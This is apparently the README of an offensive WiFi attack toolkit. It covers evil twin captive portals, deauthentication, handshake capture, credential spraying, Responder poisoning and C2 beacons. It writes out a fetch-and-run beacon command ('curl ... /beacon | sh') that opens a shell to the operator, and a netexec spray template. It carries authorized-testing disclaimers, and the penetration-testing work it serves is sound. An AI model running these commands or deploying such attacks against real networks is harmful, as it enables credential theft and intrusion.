<div align="center">

![MALSTROM Header](https://capsule-render.vercel.app/api?type=waving&color=0:00d2ff,100:3a7bd5&height=200&section=header&text=MALSTROM&fontSize=80&fontColor=ffffff&animation=fadeIn&fontAlignY=38)

<img width="1376" height="768" alt="DarkSec Malstrom Operator Dashboard" src="https://github.com/user-attachments/assets/0a888476-03df-4973-9b29-517139c3ba60" />

<!-- Static Badges -->
![License](https://img.shields.io/badge/License-Authorized--Use--Only-red.svg)
![Version](https://img.shields.io/badge/version-2.4-blue)
![Platform](https://img.shields.io/badge/Platform-Linux-orange)
![Language](https://img.shields.io/badge/Language-Python%20%7C%20Bash-green)
![Category](https://img.shields.io/badge/Category-Security-red)
![Maintained](https://img.shields.io/badge/Maintained-Yes-brightgreen)
![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen)
![Made with Love](https://img.shields.io/badge/Made%20with-%E2%9D%A4%EF%B8%8F-red)

<!-- Dynamic GitHub Badges -->
![Last Commit](https://img.shields.io/github/last-commit/wickednull/MALSTROM)
![Issues](https://img.shields.io/github/issues/wickednull/MALSTROM)
![Pull Requests](https://img.shields.io/github/issues-pr/wickednull/MALSTROM)
![Stars](https://img.shields.io/github/stars/wickednull/MALSTROM?style=social)
![Forks](https://img.shields.io/github/forks/wickednull/MALSTROM?style=social)

<br />

**MALSTROM** — An all-in-one WiFi attack & post-exploitation platform for Linux. Automates rogue access points, evil twin portals, deauth/disassociation, KARMA, MITM, recon, scanning, and lateral movement with a real-time operator dashboard, credential capture, exfil, and Lua-style modules for automation.

</div>

---

### 📊 Project Stats

| Metric | Value |
| :--- | :--- |
| **Attack Types** | Rogue AP, Evil Twin, Deauth (Raw/Aireplay), Karma, MITM Poisoning |
| **Post-Exploitation** | Lateral Movement (NetExec), Responder, POSIX/PS Beacons |
| **Interface** | Real-time Web Dashboard (SSE Stream) bound to `127.0.0.1:8888` |
| **Architecture** | Native Python Orchestrator with OS-level virtual interfaces (`ap0`) |
| **Target OS** | Linux (Kernel 5.x+) |
| **Dependencies** | `python3`, `hostapd`, `dnsmasq`, `iptables`, `iw`, `aireplay-ng`, `tcpdump`, `nmap`, `netexec`, `responder` |

---

### 📖 Description

**DarkSec MALSTROM** automates the end-to-end WiFi attack vector from a single, unified process. Designed for security auditing and offensive wireless ops, it manages target SSID cloning, frame injection, and OS-adaptive captive portal deployment while exposing an interactive web dashboard bound to `http://127.0.0.1:8888`.

By carving out a virtual wireless interface (`ap0`) from a dedicated secondary radio, MALSTROM runs isolated rogue access point deployments while preserving active upstream internet management connections.

```text
┌─────────────────────────────────────────────────────────────────────────┐
│ DARKSEC MALSTROM v2.4                                                   │
│ [[http://127.0.0.1:8888](http://127.0.0.1:8888)]                                                 │
├─────────────────────────────────────────────────────────────────────────┤
│ INTERFACE  │ wlan1mon (Radio 1) | AP IFACE │ ap0 (Radio 2)              │
│ TARGET     │ 00:11:22:33:44:55 (Target_SSID) | CH 6                     │
├─────────────────────────────────────────────────────────────────────────┤
│ AUDITING & ATTACK MODULES                                               │
│ [x] Deauth (Aireplay/Raw)   [x] Captive Portal         [ ] Karma Listen │
│ [x] EAPOL/PMKID Sniffer     [ ] NetExec Spray          [ ] Responder    │
├─────────────────────────────────────────────────────────────────────────┤
│ [ LAUNCH ATTACK CHAIN ]                                [ DISARM / STOP ]│
├─────────────────────────────────────────────────────────────────────────┤
│ LIVE SSE EVENT STREAM & MONITORING TABLE                                │
└─────────────────────────────────────────────────────────────────────────┘

> ⚠️ IMPORTANT
> This tool is intended for authorized penetration testing, network troubleshooting, or educational research only. Unauthorized frame injection, rogue AP deployment, or credential harvesting on networks without prior written consent is illegal.
> 
✨ Features
 * Full-Chain WiFi Automation — Execute target cloning, deauthentication bursts, and OS-adaptive captive portals simultaneously.
 * Single-Pane Operator Dashboard — Web-based UI (127.0.0.1:8888) driven by a live SSE event stream for monitoring client tracking, ARP alerts, and harvested loot.
 * Non-Disruptive Wireless Architecture — Carves a virtual interface (ap0) out of spare wireless hardware to keep management up-links active.
 * Flexible Deauth Engine — Offers broadcast, targeted, and silent/adaptive frame injection modes.
 * Integrated Handshake & PMKID Capture — Automated EAPOL 4-way handshake sniffer and RSN PMKID extraction that isolates target traffic from local AP noise.
 * Post-Exploitation Pipeline — Built-in Wrappers for nmap host discovery, netexec credential spraying across SMB/SSH/RDP/WinRM, and Responder LLMNR/mDNS/NBT-NS poisoning.
 * Beacon Command & Control — Serves light-footprint, target-validated execution agents for POSIX (sh) and Windows (PowerShell).
 * Structured Vault Storage — Centralized local storage for captures, credentials, probe logs, and network maps.
🛠️ Requirements
 * OS: Linux (Kernel 5.x or higher) with root/sudo access.
 * Hardware: Minimum two WiFi interfaces (one supporting monitor mode/injection and one supporting AP mode).
 * Python Version: Python 3.9+
 * System Dependencies:
   * Wireless & Core: hostapd, dnsmasq, iptables, iw, aireplay-ng, tcpdump
   * Post-Exploitation: nmap, netexec, responder
📋 Table of Contents
 * Installation
 * Quick Start
 * Dashboard Workspaces
 * Post-Exploitation Modules
 * Capture & Deauth Specifications
 * Loot Vault & Maintenance
 * Repository Structure
 * Contributing
 * Disclaimer
 * License
⚙️ Installation
 * Clone the repository:
   git clone [https://github.com/wickednull/MALSTROM.git](https://github.com/wickednull/MALSTROM.git)
cd MALSTROM

 * Grant execution permissions to the binary:
   chmod +x bin/malstrom

 * Perform an environment readiness audit:
   sudo ./bin/malstrom --check

💻 Quick Start
Run the primary launcher binary with elevated root permissions:
# Full stack execution (engine + portal + dashboard)
sudo ./bin/malstrom

# Launch and automatically open the operator dashboard in default browser
sudo ./bin/malstrom --open

# Launch without token gate enforcement on localhost
sudo ./bin/malstrom --no-auth

CLI Management Commands
sudo malstrom start       # Start background daemon & display access details
sudo malstrom launch      # Start daemon if needed and launch signed-in UI
malstrom open             # Open dashboard with auto-filled access token
malstrom token            # Print current operator access token

🖥️ Dashboard Workspaces
| Workspace | Description |
|---|---|
| Attack | Configure target BSSID/SSID/Channel, rogue portal operational modes, and deauth rates. |
| Payload | Manage WPA handshake/PMKID sniffer parameters and upload custom captive HTML templates. |
| Monitor | Real-time tracking of connected rogue-subnet clients, probe requests, and active KARMA responses. |
| Loot | Multi-tab vault displaying collected credentials, device fingerprints, handshakes, and PCAP files. |
| Recon | Subnet discovery and TCP port scanning (Nmap wrapper) linked directly to the Lateral module. |
| Lateral | Automated credential spraying via netexec against discovered target hosts (SMB/SSH/RDP/WinRM). |
| MITM | Integrated Responder controls for broadcast poisoning and NetNTLMv2 hash harvesting. |
| Sessions | C2 agent session interface for interactive POSIX sh and PowerShell /beacon payloads. |
| Settings | Operational controls for network interfaces, authentication tokens, and system resets. |
⚙️ Post-Exploitation Modules
 * Recon & Mapping
   Executes sweeps across target networks (including rogue 172.16.52.0/24 or local LAN CIDRs). Scanned hosts automatically feed into the lateral movement pipeline.
 * Lateral Movement (Credential Spray)
   Wrapper for netexec that tests harvested portal credentials against discovered hosts:
   netexec <protocol> <target_cidr> -u <user> -p <pass>

   Valid credentials generate [+] OWNED alerts and are logged to owned.json.
 * MITM & Poisoning
   Runs Responder directly on the rogue AP interface to capture broadcast name resolution traffic (LLMNR/mDNS/NBT-NS). Intercepted NetNTLMv2 hashes are pre-formatted for hashcat.
 * Beacon Sessions
   Deploys C2 execution agents for target validation and persistent shell access:
   * POSIX: curl -s http://<portal-ip>/beacon | sh
   * PowerShell: http://<portal-ip>/beacon.ps1
📊 Capture & Deauth Specifications
WPA Capture Vectors
| Mode | Target Frame Types | Output |
|---|---|---|
| handshake | EAPOL 4-Way Handshake (Msg1 + Msg2) | Captured .pcap & handshakes.json |
| pmkid | RSN PMKID Elements (00 0f ac 04) | Extracted PMKID hashes |
| both | EAPOL Msg1/Msg2 + RSN Elements | Full PCAPs + Hashcat-ready dumps |
Deauth Operating Modes
| Mode | Operation Mechanics |
|---|---|
| broadcast | Transmits FF:FF:FF:FF:FF:FF deauthentication frames across the target channel. |
| targeted | Restricts frame injection to specifically discovered client MAC addresses. |
| adaptive | Silent monitoring that triggers targeted bursts only when client traffic is observed. |
| off | Disables active frame injection while maintaining passive capture and portal deployment. |
📝 Loot Vault & Maintenance
Data collected during operations is recorded under ~/loot/malstrom/ (or /var/lib/malstrom when running system daemon modes):
~/loot/malstrom/
├── creds.json          # Captured portal credentials
├── devices.json        # Client fingerprints (MAC, Hostname, OS, User-Agent)
├── handshakes.json     # Indexed EAPOL and PMKID captures
├── hashes.json         # Intercepted NetNTLMv2 hashes
├── owned.json          # Validated lateral movement pairs
├── probes.json         # Logged Karma probe requests
├── pcaps/              # Raw 802.1X frame captures (.pcap)
└── scans.json          # Cached network recon output

System Reset Options
 * Wipe Loot: sudo malstrom wipe-loot — Flushes harvested loot while leaving configuration intact.
 * Factory Reset: sudo malstrom reset — Halts running daemons, clears loot, resets system state, and deletes access tokens.
📂 Repository Structure
MALSTROM/
├── bin/
│   └── malstrom        # CLI management binary
├── malstrom/
│   ├── app.py          # Central orchestrator & CLI execution loop
│   ├── web.py          # Dashboard HTTP server & SSE stream handler
│   ├── portal.py       # Python-native captive portal engine
│   ├── services.py     # hostapd, dnsmasq, and iptables lifecycle handlers
│   ├── deauth.py       # Frame injection & raw socket engine
│   ├── capture.py      # EAPOL / PMKID sniffer module
│   ├── lateral.py      # Netexec credential spray wrapper
│   ├── mitm.py         # Responder integration module
│   └── beacon.py       # Agent payload server & session manager
├── www/                # Web dashboard assets (JS/CSS)
└── portal/
    └── templates/      # OS-adaptive captive portal templates

🤝 Contributing
Contributions are welcome! To contribute:
 * Fork the repo.
 * Create a feature branch (git checkout -b feature/amazing-feature).
 * Commit your changes (git commit -m 'Add amazing feature').
 * Push to the branch (git push origin feature/amazing-feature).
 * Open a Pull Request.
⚠️ Disclaimer
Use at your own risk. The authors assume no liability for misuse or damage caused by this software. DarkSec MALSTROM is provided as-is for security research and authorized testing purposes only. Always obtain proper written permission prior to testing networks or devices.
📄 License
Distributed under the Custom Security Research / Authorized-Use License. See LICENSE for details.
<div align="center">
Project Link: https://github.com/wickednull/MALSTROM
Author: wickednull
Organization: DarkSec
Happy (ethical) hacking! 🏴‍☠️
</div>

